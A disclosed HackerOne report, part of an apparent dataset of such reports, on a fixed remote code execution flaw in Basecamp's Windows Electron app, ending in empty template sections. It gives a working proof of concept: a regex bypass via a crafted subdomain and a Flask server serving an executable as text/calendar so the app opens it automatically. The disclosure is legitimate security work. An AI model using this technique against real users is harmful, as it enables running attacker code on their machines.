---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1016966'
original_report_id: '1016966'
title: Remote Code Execution in Basecamp Windows Electron App
weakness: Code Injection
team_handle: basecamp
created_at: '2020-10-23T11:30:45.327Z'
disclosed_at: '2020-11-19T21:24:55.782Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 45
asset_identifier: basecamp3.exe
asset_type: DOWNLOADABLE_EXECUTABLES
max_severity: critical
tags:
- hackerone
- code-injection
---

# Remote Code Execution in Basecamp Windows Electron App

## Metadata

- HackerOne Report ID: 1016966
- Weakness: Code Injection
- Program: basecamp
- Disclosed At: 2020-11-19T21:24:55.782Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

The Windows application for Basecamp, allows a "Download" feature for images in your posts. Under certain restrictions, those files are downloaded and sometimes even automatically opened (executed). The file will be executed if it's a download from an internal URL and the mimetype is text/calendar. But these restrictions can be bypassed to execute an attacker crafted file.

I was able to craft a link, which when clicked by a user, will be downloaded and executed! 

To get file execution on the user, we bypass the restrictions first:
There is a regular expression which checks for "internal domains", which can easily be bypassed by controlling the subdomain. The host pattern is `/(launchpad\.37signals\.com|launchpad\.(?:dev|test))/` and `/(3\.(?:staging\.)?basecamp\.com|bc3\.(?:dev|test))/`. By controlling the subdomain, and setting it to something like `launchpad.dev.mydomain.com`, we can bypass this regular expression verification.

Since we'll be sending the request to our own server, we simply need to return `text/calendar` as the content-type header. This can be seen in the Electron code in `OPENABLE_MIME_TYPES = new Set(["text/calendar"]);`
And then when adding the URL to your post, simply add the `?attachment=true` to the URL. 


To reproduce, simply register any subdomain that starts with `launchpad.dev.` (mine is `launchpad.dev.████`).
An HTTP server with the needed mimetype header, can be setup with Flask easily with this code:
```
from flask import Flask, send_from_directory
app = Flask(__name__)
@app.route('/<path:path>')
def hello(path):
    return send_from_directory(".", "file.exe", as_attachment=True, mimetype="text/calendar")
if __name__ == '__main__':
    app.run(port=80,host="0.0.0.0")
```

Then add the link to your post with the appropriate `attachment` parameter, as such:
`http://launchpad.dev.█████████/file.exe?attachment=true`

## Impact

Remote code execution on any user which clicks a link on your crafted post through the desktop app.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
